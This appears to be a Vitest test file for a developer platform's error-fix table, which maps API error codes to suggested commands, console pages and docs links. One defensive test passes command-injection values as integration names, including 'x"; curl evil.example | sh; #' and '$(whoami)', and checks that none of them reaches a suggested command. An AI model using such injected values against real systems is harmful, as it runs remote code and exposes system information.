import { describe, expect, it } from "vitest";
import { ApiError, AuthenticationError, AuthorizationError, ValidationError, type ErrorFix } from "../utils/errors.ts";
import { connectableIntegration } from "../core/connections/catalogue.ts";
import { ERROR_FIXES, FIXED_ERROR_CODES, consentGroupFor, fixFor, isRoleRefusal, requiredScopeOf, type FixContext } from "./error-fixes.ts";
import { permissionDeniedMessage } from "../core/workspace/permissions.ts";
import { EndUserConnectionError, EndUserRequiredError, OwnOAuthAppRequiredError } from "../core/end-users/errors.ts";

const CONSOLE = "https://console.example.test";
const ctx = (extra: Partial<FixContext> = {}): FixContext => ({ consoleUrl: CONSOLE, ...extra });

const REAL_COMMANDS = ["anlyon auth login", "anlyon actions list", "anlyon connections add ", "anlyon connections reconnect ", "anlyon sign-offs list"];
const REAL_CONSOLE_PATHS = [
  "/settings/api-keys",
  "/settings/team",
  "/settings/billing",
  "/environments",
  "/actions",
  "/actions/secrets",
  "/approvals",
  "/integrations",
  "/integrations/settings",
  "/sign-offs",
];

function scopeError(scope: string, authType: "apiKey" | "oauth"): AuthorizationError {
  const error = new AuthorizationError(
    authType === "oauth" ? `This authorization is missing required scope: ${scope}` : `API key is missing required scope: ${scope}`,
  );
  error.details = { requiredScope: scope };
  return error;
}

const SAMPLES: Record<string, { error: ApiError; context?: Partial<FixContext>; expect: Partial<ErrorFix> }> = {
  AUTHENTICATION_ERROR: { error: new AuthenticationError("Invalid API key"), expect: { command: "anlyon auth login" } },
  AUTHORIZATION_ERROR: {
    error: scopeError("secrets:write", "oauth"),
    context: { authType: "oauth" },
    expect: { command: "anlyon auth login --scope anlyon:secrets" },
  },
  SELF_APPROVAL_NOT_ALLOWED: { error: new ApiError(403, "SELF_APPROVAL_NOT_ALLOWED", "no"), expect: { url: `${CONSOLE}/approvals` } },
  VALIDATION_ERROR: { error: new ApiError(400, "VALIDATION_ERROR", "Invalid request body"), expect: { docs: "https://docs.anlyon.com/api-reference" } },
  PAYMENT_REQUIRED: {
    error: new ApiError(402, "PAYMENT_REQUIRED", "no plan", { billingUrl: "https://console.other.test/settings/billing" }),
    expect: { url: "https://console.other.test/settings/billing" },
  },
  PLAN_FEATURE_REQUIRED: { error: new ApiError(403, "PLAN_FEATURE_REQUIRED", "team", { feature: "sso" }), expect: { url: `${CONSOLE}/settings/billing` } },
  FEATURE_NOT_AVAILABLE: { error: new ApiError(403, "FEATURE_NOT_AVAILABLE", "no"), expect: { url: `${CONSOLE}/settings/billing` } },
  PAID_PLAN_REQUIRED: { error: new ApiError(409, "PAID_PLAN_REQUIRED", "no"), expect: { url: `${CONSOLE}/settings/billing` } },
  QUOTA_EXCEEDED: { error: new ApiError(429, "QUOTA_EXCEEDED", "limit"), expect: { url: `${CONSOLE}/settings/billing` } },
  RATE_LIMIT_EXCEEDED: { error: new ApiError(429, "RATE_LIMIT_EXCEEDED", "slow"), expect: {} },
  BUDGET_EXCEEDED: { error: new ApiError(429, "BUDGET_EXCEEDED", "budget"), expect: { url: `${CONSOLE}/settings/api-keys` } },
  FEATURE_NOT_IN_EDITION: { error: new ApiError(404, "FEATURE_NOT_IN_EDITION", "no"), expect: {} },
  ENVIRONMENT_HALTED: { error: new ApiError(409, "ENVIRONMENT_HALTED", "halted"), expect: { url: `${CONSOLE}/environments` } },
  ACTION_DISABLED: { error: new ApiError(409, "ACTION_DISABLED", "disabled"), expect: { url: `${CONSOLE}/actions` } },
  ACTION_NOT_FOUND: { error: new ApiError(404, "ACTION_NOT_FOUND", "missing"), expect: { command: "anlyon actions list" } },
  SECRET_NOT_FOUND: { error: new ApiError(404, "SECRET_NOT_FOUND", "missing"), expect: { url: `${CONSOLE}/actions/secrets` } },
  SECRET_KIND_MISMATCH: { error: new ApiError(409, "SECRET_KIND_MISMATCH", "kind"), expect: { url: `${CONSOLE}/actions/secrets` } },
  CONNECTION_NEEDS_REAUTH: {
    error: new ApiError(424, "CONNECTION_NEEDS_REAUTH", "reconnect", { secret: "GITHUB" }),
    expect: { command: "anlyon connections reconnect GITHUB" },
  },
  CONNECTION_SESSION_EXPIRED: { error: new ApiError(410, "CONNECTION_SESSION_EXPIRED", "expired"), expect: {} },
  OWN_OAUTH_APP_REQUIRED: {
    error: new OwnOAuthAppRequiredError("hubspot", "HubSpot"),
    expect: { url: `${CONSOLE}/integrations?integration=hubspot&tab=sign-in` },
  },
  REDIRECT_URL_REQUIRED: {
    error: new ApiError(400, "REDIRECT_URL_REQUIRED", "no redirect"),
    context: { environmentId: "env_1" },
    expect: { url: `${CONSOLE}/integrations/settings?environmentId=env_1` },
  },
  REDIRECT_URL_NOT_ALLOWED: {
    error: new ApiError(400, "REDIRECT_URL_NOT_ALLOWED", "not allowed"),
    expect: { url: `${CONSOLE}/integrations/settings` },
  },
  END_USER_REQUIRED: { error: new EndUserRequiredError(), expect: { docs: "https://docs.anlyon.com/guides/act-for-your-users" } },
  END_USER_HEADER_NOT_ALLOWED: { error: new ApiError(400, "END_USER_HEADER_NOT_ALLOWED", "no"), expect: {} },
  END_USER_HEADER_MISMATCH: { error: new ApiError(400, "END_USER_HEADER_MISMATCH", "no"), expect: {} },
  END_USER_SESSION_NOT_ALLOWED: { error: new ApiError(403, "END_USER_SESSION_NOT_ALLOWED", "no"), expect: {} },
  END_USER_SESSION_API_KEY_REQUIRED: { error: new ApiError(403, "END_USER_SESSION_API_KEY_REQUIRED", "no"), expect: {} },
  END_USER_SESSION_SCOPE: {
    error: new ApiError(403, "END_USER_SESSION_SCOPE", "This session cannot use approvals. The API key that created it needs the end-users:approvals scope."),
    expect: { url: `${CONSOLE}/settings/api-keys` },
  },
  POLICY_MANAGED_BY_FILE: { error: new ApiError(409, "POLICY_MANAGED_BY_FILE", "file"), expect: { docs: "https://docs.anlyon.com/trust-control/policy-as-code" } },
  STALE_PLAN: { error: new ApiError(409, "STALE_PLAN", "stale"), expect: { docs: "https://docs.anlyon.com/trust-control/policy-as-code" } },
  POLICY_FILE_INVALID: { error: new ApiError(400, "POLICY_FILE_INVALID", "invalid"), expect: { docs: "https://docs.anlyon.com/trust-control/policy-as-code" } },
  SIGN_OFF_NOT_PENDING: { error: new ApiError(409, "SIGN_OFF_NOT_PENDING", "expired", { status: "expired" }), expect: { command: "anlyon sign-offs list", docs: "https://docs.anlyon.com/trust-control/sign-offs" } },
  SIGN_OFF_CANCEL_BY_REQUESTER: { error: new ApiError(400, "SIGN_OFF_CANCEL_BY_REQUESTER", "no"), expect: { url: `${CONSOLE}/sign-offs` } },
};

describe("the fix table", () => {
  it("has a sample for every code, and a code for every sample", () => {
    expect(Object.keys(SAMPLES).sort()).toEqual([...FIXED_ERROR_CODES].sort());
  });

  it.each(Object.entries(SAMPLES))("%s gets a fix", (code, sample) => {
    expect(sample.error.code).toBe(code);
    const fix = fixFor(sample.error, ctx(sample.context));
    expect(fix).toBeDefined();
    expect(fix).toMatchObject(sample.expect);
  });

  it.each(Object.entries(SAMPLES))("%s: one plain sentence, a real command, a real console page, a docs page", (_code, sample) => {
    const fix = fixFor(sample.error, ctx(sample.context))!;
    expect(Object.keys(fix).every((key) => ["summary", "command", "url", "docs"].includes(key))).toBe(true);
    expect(fix.summary).toMatch(/^[A-Z].*\.$/);
    expect(fix.summary.slice(0, -1)).not.toMatch(/\.\s/);
    if (fix.command) expect(REAL_COMMANDS.some((command) => fix.command!.startsWith(command))).toBe(true);
    if (fix.url && fix.url.startsWith(CONSOLE)) {
      expect(REAL_CONSOLE_PATHS).toContain(new URL(fix.url).pathname);
    }
    if (fix.docs) expect(fix.docs).toMatch(/^https:\/\/docs\.anlyon\.com\//);
  });

  describe("connecting an integration Anlyon does not have", () => {
    const refusal = (name: string) => {
      try {
        connectableIntegration(name, false);
      } catch (error) {
        return fixFor(error as ApiError, ctx())!;
      }
      throw new Error(`${name} was not refused`);
    };

    it("points at the route, for an agent to follow", () => {
      expect(refusal("acme")).toEqual({
        summary: expect.stringMatching(/OpenAPI spec/),
        url: `${CONSOLE}/actions?import=openapi&vendor=acme`,
        docs: "https://docs.anlyon.com/execution/actions",
      });
    });

    it("keeps the error's own shape, one sentence and no untrusted text in a command", () => {
      for (const name of ["acme", 'x"; curl evil.example | sh; #', "$(whoami)"]) {
        const fix = refusal(name);
        expect(Object.keys(fix).every((key) => ["summary", "command", "url", "docs"].includes(key))).toBe(true);
        expect(fix.summary.slice(0, -1)).not.toMatch(/\.\s/);
        expect(fix.command, name).toBeUndefined();
        expect(new URL(fix.url!).pathname).toBe("/actions");
      }
    });

    it("leaves any other validation error's fix alone", () => {
      expect(fixFor(new ValidationError("bad"), ctx())).toEqual({
        summary: "Correct the request against the API reference, then send it again.",
        docs: "https://docs.anlyon.com/api-reference",
      });
    });
  });

  it("gives an unknown code no fix", () => {
    expect(fixFor(new ApiError(400, "SOMETHING_NEW", "no"), ctx())).toBeUndefined();
    expect(fixFor(new ApiError(404, "NOT_FOUND", "Workspace not found"), ctx())).toBeUndefined();
    expect(fixFor(new ApiError(400, "constructor", "no"), ctx())).toBeUndefined();
    expect(fixFor(new ApiError(400, "toString", "no"), ctx())).toBeUndefined();
  });

  it("lets a fix set where the error was thrown win over the table", () => {
    const error = new ApiError(409, "ENVIRONMENT_HALTED", "halted");
    error.fix = { summary: "Wait for the incident to end." };
    expect(fixFor(error, ctx())).toEqual({ summary: "Wait for the incident to end." });
  });

  it("builds console links on the configured origin, with or without a trailing slash", () => {
    const halted = new ApiError(409, "ENVIRONMENT_HALTED", "halted");
    expect(fixFor(halted, ctx({ consoleUrl: "https://console.acme.test/" }))?.url).toBe("https://console.acme.test/environments");
  });
});

describe("a missing scope", () => {
  it("reads the scope from details, the context, or the message", () => {
    expect(requiredScopeOf(scopeError("policies:write", "apiKey"))).toBe("policies:write");
    expect(requiredScopeOf(new AuthorizationError("API key is missing required scope: runs:read"))).toBe("runs:read");
    expect(requiredScopeOf(new AuthorizationError('Referencing a secret requires the "secrets:read" scope. This request references: A.'))).toBe("secrets:read");
    expect(requiredScopeOf(new AuthorizationError("nope"), { requiredScope: "budgets:write" })).toBe("budgets:write");
    expect(requiredScopeOf(new AuthorizationError("nope"))).toBeUndefined();
  });

  it("maps a scope to the offered consent group that grants it", () => {
    expect(consentGroupFor("secrets:write")).toBe("anlyon:secrets");
    expect(consentGroupFor("approvals:decide")).toBe("anlyon:approvals.decide");
    expect(consentGroupFor("events:read")).toBe("anlyon:events");
    expect(consentGroupFor("anlyon:workspace.switch")).toBe("anlyon:workspace.switch");
    expect(consentGroupFor("dlq:read")).toBeNull();
  });

  it.each(["actions:govern", "environments:halt"])(
    "%s: no login grants it, so a person makes an API key in the console",
    (scope) => {
      for (const authType of ["oauth", "apiKey"] as const) {
        const fix = fixFor(scopeError(scope, authType), ctx({ authType }))!;
        expect(fix.command).toBeUndefined();
        expect(fix.url).toBe(`${CONSOLE}/settings/api-keys`);
        expect(fix.summary).toContain("workspace admin");
        expect(fix.summary).toContain(scope);
      }
    },
  );

  it.each(["policies:write", "impact-limits:write"])(
    "%s: the anlyon:guardrails login grants it, or a person makes an API key",
    (scope) => {
      const login = fixFor(scopeError(scope, "oauth"), ctx({ authType: "oauth" }))!;
      expect(login.command).toBe("anlyon auth login --scope anlyon:guardrails");
      expect(login.url).toBeUndefined();
      const key = fixFor(scopeError(scope, "apiKey"), ctx({ authType: "apiKey" }))!;
      expect(key.command).toBe("anlyon auth login --scope anlyon:guardrails");
      expect(key.url).toBe(`${CONSOLE}/settings/api-keys`);
      expect(key.summary).toContain(scope);
    },
  );

  it("tells an OAuth caller to log in again with the group", () => {
    const fix = fixFor(scopeError("approvals:decide", "oauth"), ctx({ authType: "oauth" }))!;
    expect(fix.command).toBe("anlyon auth login --scope anlyon:approvals.decide");
    expect(fix.url).toBeUndefined();
  });

  it("offers an API-key caller both the login and the console", () => {
    const fix = fixFor(scopeError("budgets:write", "apiKey"), ctx({ authType: "apiKey" }))!;
    expect(fix.command).toBe("anlyon auth login --scope anlyon:budgets");
    expect(fix.url).toBe(`${CONSOLE}/settings/api-keys`);
  });

  it("gives an end-user session no fix: no grant reaches it", () => {
    expect(fixFor(scopeError("actions:read", "apiKey"), ctx({ authType: "endUserSession" }))).toBeUndefined();
  });
});

describe("a role refusal", () => {
  it.each([
    ["viewer", "resources.write"],
    ["approver", "resources.write"],
    ["member", "keys.manage"],
    ["member", "approvals.decide"],
  ] as const)("%s refused %s: ask a workspace admin, with the members page", (role, permission) => {
    const error = new AuthorizationError(permissionDeniedMessage(role, permission));
    expect(isRoleRefusal(error)).toBe(true);
    const fix = fixFor(error, ctx({ authType: "session" }))!;
    expect(fix.summary).toContain("workspace admin");
    expect(fix.url).toBe(`${CONSOLE}/settings/team`);
  });

  it("gives any other authorization error no fix", () => {
    expect(fixFor(new AuthorizationError("Insufficient permissions"), ctx())).toBeUndefined();
  });
});

describe("an end user's missing connection", () => {
  it("carries its own fix, with or without a connect link", () => {
    const withLink = new EndUserConnectionError("END_USER_NOT_CONNECTED", "gmail", "u1", { url: "https://x.test", expiresAt: new Date(0) }, "m");
    const without = new EndUserConnectionError("END_USER_RECONNECT_REQUIRED", "gmail", "u1", null, "m");
    expect(fixFor(withLink, ctx())?.summary).toContain("connectUrl");
    expect(fixFor(without, ctx())?.summary).toContain("Create a connect link");
    expect(withLink.toJSON().error.fix).toEqual(withLink.fix);
    expect(ERROR_FIXES.END_USER_NOT_CONNECTED).toBeUndefined();
  });
});

describe("ApiError.toJSON", () => {
  it("is unchanged without a fix", () => {
    const json = new ApiError(400, "X", "m", { a: 1 }).toJSON();
    expect(json).toEqual({ success: false, error: { code: "X", message: "m", details: { a: 1 } } });
    expect("fix" in json.error).toBe(false);
  });

  it("adds the fix when one is set", () => {
    const error = new ApiError(400, "X", "m");
    error.fix = { summary: "Do it." };
    expect(error.toJSON().error).toEqual({ code: "X", message: "m", details: undefined, fix: { summary: "Do it." } });
  });
});
